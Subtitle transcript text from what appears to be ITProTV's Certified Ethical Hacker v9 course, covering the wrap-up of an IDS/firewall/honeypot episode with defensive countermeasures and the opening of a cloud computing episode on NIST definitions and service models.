important.\n\n816\n00:35:38.385 --> 00:35:41.245\nReset malicious sessions,\nsoget them out of there.\n\n817\n00:35:41.245 --> 00:35:43.162\nYou'll wanna think about that.\n\n818\n00:35:43.162 --> 00:35:46.650\nRegularly update and patch,\nthe standard stuff we often think about.\n\n819\n00:35:46.650 --> 00:35:47.350\nIt's very important.\n\n820\n00:35:47.350 --> 00:35:51.725\nScan your topology, looking for\nunusual or suspicious behavior.\n\n821\n00:35:51.725 --> 00:35:55.840\nTraffic monitoring in general is\nalways a good way to deal with this.\n\n822\n00:35:55.840 --> 00:35:58.779\nYou should be thinking about whether\nyou're seeing a lot of fragmentation\n\n823\n00:35:58.779 --> 00:36:00.700\ntraffic coming through the firewall,\nthe IDS.\n\n824\n00:36:00.700 --> 00:36:02.791\nIf you are,\nyou should probably put a stop to that.\n\n825\n00:36:02.791 --> 00:36:05.624\nDefine the DNS servers for\nclient resolution.\n\n826\n00:36:05.624 --> 00:36:09.041\nYou know, OpenDNS, I've talked about\nthis in some of the other discussions,\n\n827\n00:36:09.041 --> 00:36:11.442\na great way to think about\ntrying to take control of DNS.\n\n828\n00:36:11.442 --> 00:36:14.042\nCuz you can hard code in a allow and\na block list so\n\n829\n00:36:14.042 --> 00:36:16.652\nthat people are not able\nto go to certain sites.\n\n830\n00:36:16.652 --> 00:36:18.304\nSo something to think about.\n\n831\n00:36:18.304 --> 00:36:21.530\nSo, you know, just some countermeasures\nthere that may be valuable for\n\n832\n00:36:21.530 --> 00:36:22.890\nyou that you want to think about,\n\n833\n00:36:22.890 --> 00:36:25.670\njust as we're getting ready to\nwrap up our discussion here.\n\n834\n00:36:25.670 --> 00:36:28.230\nWe've thrown a lot of stuff at you,\na lot of tools, and\n\n835\n00:36:28.230 --> 00:36:30.620\nMike's fingers I think\nare just about gone.\n\n836\n00:36:30.620 --> 00:36:34.450\nHe's got nubs now, right, instead of\nfingers, where he's typing so much.\n\n837\n00:36:34.450 --> 00:36:36.498\nBut I think we're in\na good place to wrap up.\n\n838\n00:36:36.498 --> 00:36:39.076\n&gt;&gt; All right.\n&gt;&gt; But just keeping in mind, ultimately,\n\n839\n00:36:39.076 --> 00:36:43.557\nas we think about the IDS, the firewall,\nthe honeypot, Honeynet conversation.\n\n840\n00:36:43.557 --> 00:36:45.925\nWe talked a lot about how you do this,\n\n841\n00:36:45.925 --> 00:36:49.485\nbut we also spoke a lot about you\nevade a lot of these and attack them.\n\n842\n00:36:49.485 --> 00:36:51.727\nThat's valuable knowledge for\nyou, because clearly,\n\n843\n00:36:51.727 --> 00:36:53.602\nthat's what the bad actors\nare gonna try to do.\n\n844\n00:36:53.602 --> 00:36:55.506\nThey're gonna try to come in and\ntake control there.\n\n845\n00:36:55.506 --> 00:36:58.710\nSo you wanna be thinking about ways\nyou can prevent that from happening.\n\n846\n00:36:58.710 --> 00:37:02.182\nAnd as I said, continuous monitoring,\npaying attention to details.\n\n847\n00:37:02.182 --> 00:37:05.356\nAnd even if it looks normal,\nright, be skeptical.\n\n848\n00:37:05.356 --> 00:37:07.702\nThat's probably the best\nadvice we can give you.\n\n849\n00:37:07.702 --> 00:37:09.885\nIf you're skeptical, chances are good\nyou're gonna find lot of things.\n\n850\n00:37:09.885 --> 00:37:11.362\n&gt;&gt; Yep.\nAll right, Adam,\n\n851\n00:37:11.362 --> 00:37:15.640\n[INAUDIBLE] great conversation there,\nwrapping up our conversation on intrusion\n\n852\n00:37:15.640 --> 00:37:20.080\ndetection systems, intrusion prevention\nsystems, firewalls, honey pots.\n\n853\n00:37:20.080 --> 00:37:23.976\nTook a look at a few of the different\ntools, some free ones, some paid ones that\n\n854\n00:37:23.976 --> 00:37:27.830\nare out there that we might want to\nplay around with, experiment with.\n\n855\n00:37:27.830 --> 00:37:33.400\nAlso looked at some different techniques\nthat we can use to try to evade IDSs and\n\n856\n00:37:33.400 --> 00:37:38.063\nfirewalls or get past those, as well as\nsome countermeasures that we can put in\n\n857\n00:37:38.063 --> 00:37:42.170\nplace to prevent people from\nevading our IDSs and our firewalls.\n\n858\n00:37:42.170 --> 00:37:43.420\nSo we thank you for that.\n\n859\n00:37:43.420 --> 00:37:45.140\nWe hope everybody out\nthere enjoyed watching.\n\n860\n00:37:45.140 --> 00:37:47.590\nSigning off for ITProTV,\nI'm Mike Roderick.\n\n861\n00:37:48.930 --> 00:37:49.850\n&gt;&gt; Yeah, that's me.\n\n862\n00:37:49.850 --> 00:37:51.430\n&gt;&gt; And Adam is being proxied.\n\n863\n00:37:51.430 --> 00:37:51.956\nAnd we'll see you next time.\n\n864\n00:37:51.956 --> 00:37:52.636\n&gt;&gt; I'm being anonymized.\n\n865\n00:37:52.636 --> 00:37:54.545\n&gt;&gt; You're being anonymized.\n\n866\n00:37:54.545 -->

00:00:19.316\nI'm your host, Mike Roderick and\ntoday we're doing CEH Version 9.\n\n4\n00:00:19.316 --> 00:00:23.675\nAnd specifically in this episode,\nwe're gonna be going into cloud computing.\n\n5\n00:00:23.675 --> 00:00:28.890\nAnd that's no longer just a catchphrase or\na term that people throw around.\n\n6\n00:00:28.890 --> 00:00:32.190\nIt's something that we're gonna deal\nwith in just about every enterprise\n\n7\n00:00:32.190 --> 00:00:33.040\nenvironment that we go to.\n\n8\n00:00:33.040 --> 00:00:35.130\nAnd it definitely brings in special or\n\n9\n00:00:35.130 --> 00:00:39.120\ndifferent concerns when it comes\nto security as well as hacking.\n\n10\n00:00:39.120 --> 00:00:41.521\nSo here to help us with that is Mr.\nAdam Gordon.\n\n11\n00:00:41.521 --> 00:00:42.400\nHow you doing Adam?\n\n12\n00:00:42.400 --> 00:00:46.050\nI'm good I'm good, I'm feeling a little\ncloudy in my perceptions today.\n\n13\n00:00:46.050 --> 00:00:50.140\nWe'll see how that translates\ninto our conversations, ha ha.\n\n14\n00:00:50.140 --> 00:00:51.750\nOkay, so let's-\n>> You had to do it didn't you.\n\n15\n00:00:51.750 --> 00:00:54.020\n>> I did, it was just too good\nof an opportunity to pass up.\n\n16\n00:00:54.020 --> 00:00:56.250\nSo let's talk about the cloud.\n\n17\n00:00:56.250 --> 00:00:57.800\nAs Mike was saying in his introduction,\n\n18\n00:00:57.800 --> 00:01:00.160\nthe cloud is what you\nwould call ubiquitous.\n\n19\n00:01:00.160 --> 00:01:01.720\nAnd we'll come back to that term and\n\n20\n00:01:01.720 --> 00:01:03.500\ntalk about why that's\nimportant here in a minute.\n\n21\n00:01:03.500 --> 00:01:05.641\nThe cloud is everywhere in other words and\n\n22\n00:01:05.641 --> 00:01:09.558\nas we think about it today as ethical\nhackers, as security professionals,\n\n23\n00:01:09.558 --> 00:01:13.596\nwe have to understand that this is\nsomething that good, bad, right, wrong,\n\n24\n00:01:13.596 --> 00:01:17.571\nwhether you like it, love it, or hate it\nis probably here to stay in one form or\n\n25\n00:01:17.571 --> 00:01:20.814\nanother unless marketing comes\nup with a better way to describe\n\n26\n00:01:20.814 --> 00:01:25.023\ndistributed computing, in which case,\nwe'll call it the Internet of Things.\n\n27\n00:01:25.023 --> 00:01:29.240\nBut I'm thinking that may\nhappen sometime in the future.\n\n28\n00:01:29.240 --> 00:01:32.610\nQuote me on that when it does, and\nlet me know how that turns out.\n\n29\n00:01:32.610 --> 00:01:36.130\nBut whether it Internet of Things,\nwhether we call it the cloud,\n\n30\n00:01:36.130 --> 00:01:39.740\nwhether we call it,\nwho knows what will come after that.\n\n31\n00:01:39.740 --> 00:01:41.730\nThe reality is that we\nare talking about a model, and\n\n32\n00:01:41.730 --> 00:01:44.130\nwe gonna start by describing\na model here in a minute that,\n\n33\n00:01:44.130 --> 00:01:48.270\nas security professionals, we really\nhave to ponder, we have to consider, and\n\n34\n00:01:48.270 --> 00:01:52.450\nwe have to figure out how to\nre-integrate into our thought process.\n\n35\n00:01:52.450 --> 00:01:54.690\nSo what I mean by that is,\nit's already there.\n\n36\n00:01:54.690 --> 00:01:56.660\nIf I would say integrate,\n\n37\n00:01:56.660 --> 00:01:59.360\nI would be implying we have to\nbring it in because it's brand new.\n\n38\n00:01:59.360 --> 00:02:03.608\nBut the reality is we've had\nthe thought process about almost,\n\n39\n00:02:03.608 --> 00:02:06.518\nalmost, not quite but almost everything we\n\n40\n00:02:06.518 --> 00:02:11.081\nhave to deal with in the Cloud in\nour eco system of computer security,\n\n41\n00:02:11.081 --> 00:02:15.986\nin our policies, in our procedures,\nin our processes for some time now.\n\n42\n00:02:15.986 --> 00:02:19.420\nProbably in many cases a decade,\nmaybe two or more.\n\n43\n00:02:19.420 --> 00:02:24.100\nWe've always focused on the distinction,\nthe boundary, however you define it,\n\n44\n00:02:24.100 --> 00:02:28.640\nhowever porous and amorphous it\nmay be between the internal and\n\n45\n00:02:28.640 --> 00:02:32.780\nthe external in the computing\nworlds we live in.\n\n46\n00:02:32.780 --> 00:02:35.760\nWhen we started getting serious, in other\nwords, about it, in the enterprise,\n\n47\n00:02:35.760 --> 00:02:39.720\nwe started differentiating between\nwhat was outside and what was inside.\n\n48\n00:02:39.720 --> 00:02:44.160\nThe LAN and the WAN essentially\nwere the very first concepts\n\n49\n00:02:44.160 --> 00:02:47.450\nwe would learn about and\nto this day still do, right?\n\n50\n00:02:47.450 --> 00:02:50.060\nOther than here's the keyboard,\nhere's the mouse and by the way,\n\n51\n00:02:50.060 --> 00:02:52.360\nthere's that Windows key\nthat may be of value to you.\n\n52\n00:02:52.360 --> 00:02:55.570\nThe reality is when we talk about the LAN,\nthe local area network,\n\n53\n00:02:55.570 --> 00:03:00.550\nwe're talking about an internal network,\nprobably private in almost every case\n\n54\n00:03:00.550 --> 00:03:03.240\nnot available to people that\nare not authorized to be there.\n\n55\n00:03:03.240 --> 00:03:06.460\nThat is the classic definition\nof a private cloud.\n\n56\n00:03:06.460 --> 00:03:10.230\nAnd when we think of the WAN,\nthe wide area network, and\n\n57\n00:03:10.230 --> 00:03:14.610\nwe think about a network that is\navailable, traditionally over public\n\n58\n00:03:14.610 --> 00:03:19.190\nnetworks, we think about the fact that\nalmost without exception, everybody can\n\n59\n00:03:19.190 --> 00:03:22.590\nget to it as long they're able to connect,\nthey have the right interface,\n\n60\n00:03:22.590 --> 00:03:24.870\nmeaning typically the right machine,\nthe right software.\n\n61\n00:03:24.870 --> 00:03:27.340\nProbably one of the only restrictions\nwe would normally think about\n\n62\n00:03:27.340 --> 00:03:31.120\nwith regards to a public cloud\nis bandwidth is, connectivity or\n\n63\n00:03:31.120 --> 00:03:34.170\navailability to hit\nthe on-ramp to the network.\n\n64\n00:03:34.170 --> 00:03:38.090\nAssuming you can do that and you're able\nto connect to the wide area network,\n\n65\n00:03:38.090 --> 00:03:40.730\nclassic definition of the public cloud,\nright.\n\n66\n00:03:40.730 --> 00:03:43.485\nAnd so\nwhen we think about cloud computing,\n\n67\n00:03:43.485 --> 00:03:47.495\nwe've been talking about these terms for\nalmost ever.\n\n68\n00:03:47.495 --> 00:03:52.970\nAnd when we think about\nthe evolution of them, from LAN and\n\n69\n00:03:52.970 --> 00:03:57.872\nWAN, Intranet to private cloud,\nLAN and WAN.\n\n70\n00:03:57.872 --> 00:04:02.792\nExtranet to public cloud, because that's\nreally the definitional streamlining, and\n\n71\n00:04:02.792 --> 00:04:06.902\nthe definitional changing or thought\nprocess we've been through with regards to\n\n72\n00:04:06.902 --> 00:04:09.152\nthose terms and how they move over time.\n\n73\n00:04:09.152 --> 00:04:14.202\nAnd we think about embedded systems,\ncyber-physical systems, SCATA ICS.\n\n74\n00:04:14.202 --> 00:04:18.995\nAnd we think about the Internet of Things\nas it is connecting everything together,\n\n75\n00:04:18.995 --> 00:04:24.250\ncreating a dare I say, a web of intrigue\nand vulnerability, as well as opportunity.\n\n76\n00:04:24.250 --> 00:04:25.710\nAnd the World Wide Web, which,\n\n77\n00:04:25.710 --> 00:04:29.600\nessentially is just that, the\ninterconnected systems that we talk about.\n\n78\n00:04:29.600 --> 00:04:33.510\nYou'll remember one of our prior episodes,\nwe talked about the Shodan browser.\n\n79\n00:04:33.510 --> 00:04:36.380\nAnd we talked about the fact we can\nuse a browser like that to go out and\n\n80\n00:04:36.380 --> 00:04:40.630\nsurf the Internet of Things, and\nlook for interconnectedness, look for\n\n81\n00:04:40.630 --> 00:04:43.200\nsystems that are making\nthemselves available.\n\n82\n00:04:43.200 --> 00:04:45.120\nThe cloud is all around us,\nthe cloud is everywhere.\n\n83\n00:04:45.120 --> 00:04:47.910\nIt's been there,\nit's been there for some time.\n\n84\n00:04:47.910 --> 00:04:50.650\nWhat we need to do,\nas security professionals,\n\n85\n00:04:50.650 --> 00:04:54.460\nis think about how we're going to\nintegrate that into our thought process.\n\n86\n00:04:54.460 --> 00:04:56.970\nSo, let me ask you a quick\nquestion out there.\n\n87\n00:04:56.970 --> 00:05:02.230\nHow many of you actually define in your\nnetworks today, in your businesses today,\n\n88\n00:05:02.230 --> 00:05:06.750\nhow many of you define cloud computing\nas a distinct issue, a distinct concern,\n\n89\n00:05:06.750 --> 00:05:11.780\na distinct architecture, a distinct thing\nthat has to be thought about, managed,\n\n90\n00:05:11.780 --> 00:05:16.500\nconsumed, monitored, maintained,\nidentified in policy, in procedure and\n\n91\n00:05:16.500 --> 00:05:17.870\nprocess by name.\n\n92\n00:05:17.870 --> 00:05:21.030\nWe have a usage policy\nspecific to the cloud.\n\n93\n00:05:21.030 --> 00:05:26.162\nWe have a BCDR policy specific\nto the cloud, and a BCDR plan,\n\n94\n00:05:26.162 --> 00:05:31.020\nbusiness continuity disaster\nrecovery by the way, for the cloud.\n\n95\n00:05:31.020 --> 00:05:35.780\nIf you do that, if you have done that, if\nyou are thinking along those lines, then\n\n96\n00:05:35.780 --> 00:05:40.030\nyou've got that integration that we're\ngonna talk about here already happening.\n\n97\n00:05:40.030 --> 00:05:44.140\nBut if you haven't done that, if you,\nas almost everybody is in the world today,\n\n98\n00:05:44.140 --> 00:05:49.130\nrunning on the same thought process,\nintegrating the cloud by kinda sneaking\n\n99\n00:05:49.130 --> 00:05:52.880\nit in the back door by saying it's\nthere but not formally calling it out.\n\n100\n00:05:52.880 --> 00:05:56.940\nSimply acknowledging the fact that, yes,\nwe are there, but we're using the same\n\n101\n00:05:56.940 --> 00:06:00.840\ntraditional methods, same traditional\npolicies, procedures, processes.\n\n102\n00:06:00.840 --> 00:06:03.710\nBut we haven't included the cloud,\nwe haven't upgraded and\n\n103\n00:06:03.710 --> 00:06:05.570\nupdated our thought process.\n\n104\n00:06:05.570 --> 00:06:10.240\nThen you're doing probably what 80 to\n90% of your colleagues are doing, so\n\n105\n00:06:10.240 --> 00:06:11.625\ncongratulations.\n\n106\n00:06:11.625 --> 00:06:12.540\n>> [LAUGH]\n>> Due care and\n\n107\n00:06:12.540 --> 00:06:15.450\ndue diligence goes right out the window,\nawesome, right?\n\n108\n00:06:15.450 --> 00:06:19.860\nYou are not paying attention\nto very important distinction.\n\n109\n00:06:19.860 --> 00:06:23.660\nYou are not calling out the fact\nthat there is this new paradigm.\n\n110\n00:06:23.660 --> 00:06:26.910\nThe cloud is in almost every way,\nthe same as what we already know.\n\n111\n00:06:26.910 --> 00:06:29.740\nWe use existing technologies,\nfor the most part,\n\n112\n00:06:29.740 --> 00:06:32.230\nto integrate systems and\nmake them available.\n\n113\n00:06:32.230 --> 00:06:35.370\nVirtualization is the underpinning\nof the cloud, it’s been around for\n\n114\n00:06:35.370 --> 00:06:38.710\nthe better part of 20 years,\nhasn't really changed all that much.\n\n115\n00:06:38.710 --> 00:06:40.940\nIt's gotten bigger, it's gotten badder,\nit's gotten bolder.\n\n116\n00:06:40.940 --> 00:06:46.670\nBut, that's triple-B by the way, but\nit has not changed fundamentally.\n\n117\n00:06:46.670 --> 00:06:52.156\nWhen we started virtualizing resources\n20 something years ago now, right.\n\n118\n00:06:52.156 --> 00:06:55.485\nAnd we started with the four\nbasic resource food groups of,\n\n119\n00:06:55.485 --> 00:06:58.481\nin no particular order,\nnetworking, storage, and\n\n120\n00:06:58.481 --> 00:07:02.559\nthen what we call the compute resources,\nthe RAM and the CPU of the host.\n\n121\n00:07:02.559 --> 00:07:07.301\nWhen we virtualize those four groups\nthrough a hypervisor, abstracting physical\n\n122\n00:07:07.301 --> 00:07:11.837\nresources from the host, making them\navailable in a consumable bundle to one or\n\n123\n00:07:11.837 --> 00:07:14.343\nmore what we call guest operating systems,\n\n124\n00:07:14.343 --> 00:07:17.344\nyou'd traditionally call\nthem virtual machines.\n\n125\n00:07:17.344 --> 00:07:21.535\nWhen we do that, that's basically been\nthe same since VMware opened up shop,\n\n126\n00:07:21.535 --> 00:07:25.533\nsince they decided hey, this is what\nwe're gonna do to change the world and\n\n127\n00:07:25.533 --> 00:07:27.562\nthey did just that, right.\n\n128\n00:07:27.562 --> 00:07:31.742\nSo the reality is when we use\nvirtualization to drive the cloud, we're\n\n129\n00:07:31.742 --> 00:07:35.790\nusing existing tried and true technologies\nto be able to provide services.\n\n130\n00:07:35.790 --> 00:07:40.240\nAs a certified ethical hacker,\nwhat's our job in this mix of technology?\n\n131\n00:07:40.240 --> 00:07:43.205\nTo understand the intricacies,\nthe subtleties, but\n\n132\n00:07:43.205 --> 00:07:45.853\nalso the commonalities\nthat we have to address.\n\n133\n00:07:45.853 --> 00:07:49.494\nIf you are good at virtualization and\nunderstand networking security,\n\n134\n00:07:49.494 --> 00:07:53.433\nyou already understand the majority of\nwhat you need to do to be good at security\n\n135\n00:07:53.433 --> 00:07:55.178\nand ethical hacking in the cloud.\n\n136\n00:07:55.178 --> 00:07:58.719\nWe've got to add some things in there,\nwe'll talk about those, but\n\n137\n00:07:58.719 --> 00:08:02.137\nMost of what you need to know\nespecially in this set of episodes with\n\n138\n00:08:02.137 --> 00:08:05.880\nthis topic is gonna sound familiar to you,\nand it should by the way.\n\n139\n00:08:05.880 --> 00:08:08.810\nBecause this is stuff you are doing\nalready for the most part.\n\n140\n00:08:08.810 --> 00:08:13.620\nIf you're brand new to this,\nif this is a new foray for you in terms of\n\n141\n00:08:13.620 --> 00:08:18.460\nthinking about your career trajectory or\nyour path, whatever you want to do.\n\n142\n00:08:18.460 --> 00:08:20.961\nIf security is something you\nare just starting out learning,\n\n143\n00:08:20.961 --> 00:08:22.754\nit may not all be new to you and\nthat's okay.\n\n144\n00:08:22.754 --> 00:08:24.913\nWe'll teach you what you\nneed to know either way.\n\n145\n00:08:24.913 --> 00:08:27.949\nBut my point is for those of you\nthat have been doing this awhile,\n\n146\n00:08:27.949 --> 00:08:31.520\nthis is not gonna sound all that\ndifferent from what you already know.\n\n147\n00:08:31.520 --> 00:08:34.660\nWe need policies, we need to figure\nout how to align them with business\n\n148\n00:08:34.660 --> 00:08:38.290\nrequirements, we gotta get senior\nmanagement buying on direction and\n\n149\n00:08:38.290 --> 00:08:41.150\nmaking sure we're in the right place\ndoing the right thing at the right time.\n\n150\n00:08:41.150 --> 00:08:45.120\nWe gotta pay attention to resource usage,\nwe gotta continuously monitor.\n\n151\n00:08:45.120 --> 00:08:48.260\nWe gotta make sure we have\nconfiguration and change management.\n\n152\n00:08:48.260 --> 00:08:49.790\nWe gotta make sure we have release and\n\n153\n00:08:49.790 --> 00:08:52.920\ndeployment management to understand\nhow to deal with change.\n\n154\n00:08:52.920 --> 00:08:57.870\nWe've gotta make sure that we\nare gonna use standardization\n\n155\n00:08:57.870 --> 00:09:01.330\nto zero out any possibility of risk,\nso we're gonna use\n\n156\n00:09:01.330 --> 00:09:04.580\nvulnerability assessments to ensure that\nthings are patched to the right level.\n\n157\n00:09:04.580 --> 00:09:08.170\nAnd now we're using patch management\nto ensure continuity of service.\n\n158\n00:09:08.170 --> 00:09:11.420\nAll the things that we talk about\nthat have been best practices in\n\n159\n00:09:11.420 --> 00:09:12.980\nevery other episode, Mike and\n\n160\n00:09:12.980 --> 00:09:17.790\nI have spent time presenting to you around\nthe Certified Ethical Hacker Version.\n\n161\n00:09:17.790 --> 00:09:19.260\n>> Nine.\n>> No, you've gotta do the whole thing.\n\n162\n00:09:19.260 --> 00:09:19.850\nThe version.\n\n163\n00:09:19.850 --> 00:09:20.735\n>> Version nine.\n\n164\n00:09:20.735 --> 00:09:22.264\n>> That's not how you do it.\n>> CEH version nine.\n\n165\n00:09:22.264 --> 00:09:23.890\n>> No, version nine.\n\n166\n00:09:23.890 --> 00:09:24.795\nYou do that whole like.\n\n167\n00:09:24.795 --> 00:09:25.794\n>> [LAUGH]\n>> I don't know,\n\n168\n00:09:25.794 --> 00:09:28.218\nit's kind of that crazy voice you make.\n\n169\n00:09:28.218 --> 00:09:30.860\nIt's almost like the Pillsbury dough\nboy thing but without the woo.\n\n170\n00:09:30.860 --> 00:09:33.490\nAnyway so, you know version nine, right?\n\n171\n00:09:33.490 --> 00:09:35.750\nWhatever version it is,\nput version 12 in front of there and\n\n172\n00:09:35.750 --> 00:09:38.790\nit would be the same conversation\nwith regards to this stuff.\n\n173\n00:09:38.790 --> 00:09:43.600\nSo, let's get down to some definition\nspecifically because what we wanna do\n\n174\n00:09:43.600 --> 00:09:48.220\nis lay down some foundational vocabulary,\nsome foundational knowledge for you.\n\n175\n00:09:48.220 --> 00:09:52.310\nWe're gonna talk about the five defining\ncharacteristics of cloud computing,\n\n176\n00:09:52.310 --> 00:09:56.360\nwhere cloud computing comes from\nbased on a definitional criteria.\n\n177\n00:09:56.360 --> 00:09:57.910\nWe're gonna do that in just a second.\n\n178\n00:09:57.910 --> 00:10:00.040\nI'll put some stuff up on the screen for\nyou.\n\n179\n00:10:00.040 --> 00:10:03.610\nAll this stuff's gonna come\nout of the NIST SP 800-145\n\n180\n00:10:03.610 --> 00:10:07.170\ndocument which is the defining\ndocument for cloud computing.\n\n181\n00:10:07.170 --> 00:10:09.675\nIt's a reference document\nthat everybody goes to.\n\n182\n00:10:09.675 --> 00:10:14.628\nThere's another document that goes\nwith that, NIST SP 800-146 which\n\n183\n00:10:14.628 --> 00:10:18.865\nis a longer eightyish page document\nthat draws out the detail.\n\n184\n00:10:18.865 --> 00:10:23.377\nThe 800-145 document is a seven page\ndocument, by the time you're done with it,\n\n185\n00:10:23.377 --> 00:10:26.427\nfive of those pages are just\nbasically fluffed and filler.\n\n186\n00:10:26.427 --> 00:10:28.350\nAnd then there's only\njust two pages of stuff.\n\n187\n00:10:28.350 --> 00:10:32.265\nIt's a distilled down abstract\nof the information in 800-146.\n\n188\n00:10:32.265 --> 00:10:36.594\nSo, you wanna make sure you take a look\nat that at some point if you're gonna\n\n189\n00:10:36.594 --> 00:10:41.060\nbe doing cloud computing as part of a\nfocus in general in the world you live in,\n\n190\n00:10:41.060 --> 00:10:43.630\nin the responsibility matrix you inhabit.\n\n191\n00:10:43.630 --> 00:10:47.032\nBut it's, let me be clear, not required\nreading to prepare for the exam,\n\n192\n00:10:47.032 --> 00:10:51.250\nwe're gonna distill down the information\nyou need out of those documents right now.\n\n193\n00:10:51.250 --> 00:10:54.720\nBut 800-145 will list the five\ndefining characteristics.\n\n194\n00:10:54.720 --> 00:10:58.800\nIt lists the four deployment models\nthat we can use and it lists the three\n\n195\n00:10:58.800 --> 00:11:02.780\nacknowledged service models that we\ntalk about, something as a service.\n\n196\n00:11:02.780 --> 00:11:08.070\nAnd there are many as a service models out\nthere, hundreds of them most likely, but\n\n197\n00:11:08.070 --> 00:11:13.000\nthe reality is that we are going to focus\non IaaS, infrastructure as a service,\n\n198\n00:11:13.000 --> 00:11:17.295\nPaaS, platform as a service, and\nSaaS, software as a service.\n\n199\n00:11:17.295 --> 00:11:20.560\nAll the others are important,\nall the others are legitimate,\n\n200\n00:11:20.560 --> 00:11:24.120\nall the others exist and can be used,\nand are consumed all the time.\n\n201\n00:11:24.120 --> 00:11:26.360\nBut not everybody agrees\non their definition,\n\n202\n00:11:26.360 --> 00:11:29.940\nmost of those are being set by\nvendors who are selling services.\n\n203\n00:11:29.940 --> 00:11:34.175\nWho may modify that definition to suit\ntheir particular brand awareness, and\n\n204\n00:11:34.175 --> 00:11:35.980\nwe're not gonna deal with them.\n\n205\n00:11:35.980 --> 00:11:41.035\nSo, things like Database as a Service,\nDR, Disaster Recovery as a Service,\n\n206\n00:11:41.035 --> 00:11:44.949\nheard one recently, there is malware and-\n>> [LAUGH]\n\n207\n00:11:44.949 --> 00:11:47.055\n>> There is zombie nets or-\n\n208\n00:11:47.055 --> 00:11:47.849\n>> I was gonna say, bots as a service?\n\n209\n00:11:47.849 --> 00:11:49.084\n>> Bot nets as a service.\n\n210\n00:11:49.084 --> 00:11:50.543\n>> Yeah.\n>> So you can go out and\n\n211\n00:11:50.543 --> 00:11:54.446\nrent yourself a little bot army\nas a service on the dark web.\n\n212\n00:11:54.446 --> 00:11:58.303\nThere's all sorts of stuff you can get\nout there, but we're gonna focus on those\n\n213\n00:11:58.303 --> 00:12:02.445\nthree class of definitions, the four class\nof definitions of the deployment models,\n\n214\n00:12:02.445 --> 00:12:05.585\nwhether it is public, private,\nhybrid and or community cloud.\n\n215\n00:12:05.585 --> 00:12:08.125\nI wanna talk about all that,\nnow that I have actually talked about,\n\n216\n00:12:08.125 --> 00:12:09.340\nlet's actually go out.\n\n217\n00:12:09.340 --> 00:12:11.350\nLet's take a look at, but\nlet's go to Mike's machine real quick.\n\n218\n00:12:11.350 --> 00:12:13.210\nWe're gonna throw this definitions up.\n\n219\n00:12:13.210 --> 00:12:16.521\nWe may need to, I don't know,\nmaybe do a, I'm just thinking.\n\n220\n00:12:16.521 --> 00:12:17.167\n>> Full screen.\n\n221\n00:12:17.167 --> 00:12:18.040\n>> Yeah, full screen.\n\n222\n00:12:18.040 --> 00:12:19.080\nWe're just not gonna be able, there we go.\n\n223\n00:12:19.080 --> 00:12:21.530\nJust not gonna be able to see it,\nI'm sitting over half the screens.\n\n224\n00:12:21.530 --> 00:12:25.120\nAnyway, let's start with the essential\ncharacteristics of cloud computing.\n\n225\n00:12:25.120 --> 00:12:27.700\nYou can see that we have\non-demand self service.\n\n226\n00:12:27.700 --> 00:12:29.780\nWe have broad network access.\n\n227\n00:12:29.780 --> 00:12:31.060\nWe have resource pooling.\n\n228\n00:12:31.060 --> 00:12:32.570\nJust as Mike scrolls down.\n\n229\n00:12:32.570 --> 00:12:34.450\nWe have rapid elasticity.\n\n230\n00:12:34.450 --> 00:12:36.720\nAnd there should be one more hiding there,\nnext page.\n\n231\n00:12:36.720 --> 00:12:37.890\nWe have measured service.\n\n232\n00:12:37.890 --> 00:12:38.710\nSo let's go back.\n\n233\n00:12:38.710 --> 00:12:41.155\nLet's talk about these\nkinda one at a time.\n\n234\n00:12:41.155 --> 00:12:44.201\nThis drag and naturally speed\ncontrol thing, I'm loving it.\n\n235\n00:12:44.201 --> 00:12:46.155\n>> [LAUGH]\n>> Why don't we do this all the time so\n\n236\n00:12:46.155 --> 00:12:49.040\nI can just talk and things magically\nscroll up and down the screen?\n\n237\n00:12:49.040 --> 00:12:50.145\n>> [LAUGH]\n>> All right.\n\n238\n00:12:50.145 --> 00:12:52.275\nSo, on-demand self service,\nlet's talk about this.\n\n239\n00:12:52.275 --> 00:12:57.825\nThe idea here is that essentially what\nwe really think about with the cloud is\n\n240\n00:12:57.825 --> 00:13:03.000\nthat when a consumer or a customer wants\nto be able to provision cloud resources.\n\n241\n00:13:03.000 --> 00:13:05.810\nThey wanna be able to put up,\nor stand up a host.\n\n242\n00:13:05.810 --> 00:13:09.470\nThey wanna be able to put up or\nstand up a guest operating system.\n\n243\n00:13:09.470 --> 00:13:13.363\nThey wanna be able to add multiple\nresources so that they can scale,\n\n244\n00:13:13.363 --> 00:13:14.262\nessentially.\n\n245\n00:13:14.262 --> 00:13:18.802\nThey can do that almost immediately,\nalmost without any delay, in many cases,\n\n246\n00:13:18.802 --> 00:13:20.624\nprobably on the spot on demand.\n\n247\n00:13:20.624 --> 00:13:24.220\nAnd so it's essentially a model that\nallows us to say, I would like to\n\n248\n00:13:24.220 --> 00:13:28.260\nbe able to do that and then we can indeed\ngo out and do that with almost no delay.\n\n249\n00:13:28.260 --> 00:13:32.710\nA lot of times, this is an automated\nprocess so we may be able to use some sort\n\n250\n00:13:32.710 --> 00:13:36.050\nof automated provisioning system\nto be able to hit a button and\n\n251\n00:13:36.050 --> 00:13:39.860\ndeploy a template of some kind or\nsome sort of instance.\n\n252\n00:13:39.860 --> 00:13:45.010\nAnd if you use Amazon, if you use AWS,\nif you use Google's Cloud Platform,\n\n253\n00:13:45.010 --> 00:13:49.740\nif you use Microsoft's,\neither the Azure Fabric or\n\n254\n00:13:49.740 --> 00:13:53.220\nyou're hosting on any of\nthe major cloud vendors.\n\n255\n00:13:53.220 --> 00:13:58.290\nVMware's vCloud Air, whatever it may be,\nyou are using on-demand self-service\n\n256\n00:13:58.290 --> 00:14:02.130\nsolutions where once you pay your money,\nyou sign up and you have an account and\n\n257\n00:14:02.130 --> 00:14:05.390\nyou're at a service level, you've\nessentially got the ability to provision\n\n258\n00:14:05.390 --> 00:14:10.595\nresources at some level almost without\nexception, in an automated fashion.\n\n259\n00:14:10.595 --> 00:14:14.435\nBroad network access, I mentioned,\nubiquitousness in my introduction.\n\n260\n00:14:14.435 --> 00:14:15.664\nThe vocabulary word of the day.\n\n261\n00:14:15.664 --> 00:14:16.720\nWe haven't done word of the day.\n\n262\n00:14:16.720 --> 00:14:17.427\n>> We haven't.\n\n263\n00:14:17.427 --> 00:14:19.722\n>> We haven't done that in a while,\nwe gotta do that for\n\n264\n00:14:19.722 --> 00:14:21.450\nsome of the remaining episodes.\n\n265\n00:14:21.450 --> 00:14:22.720\nThat was always a fun one.\n\n266\n00:14:22.720 --> 00:14:23.510\n>> Ubiquitous.\n\n267\n00:14:23.510 --> 00:14:25.970\n>> Ubiquitous will be the word\nof the day today, okay.\n\n268\n00:14:25.970 --> 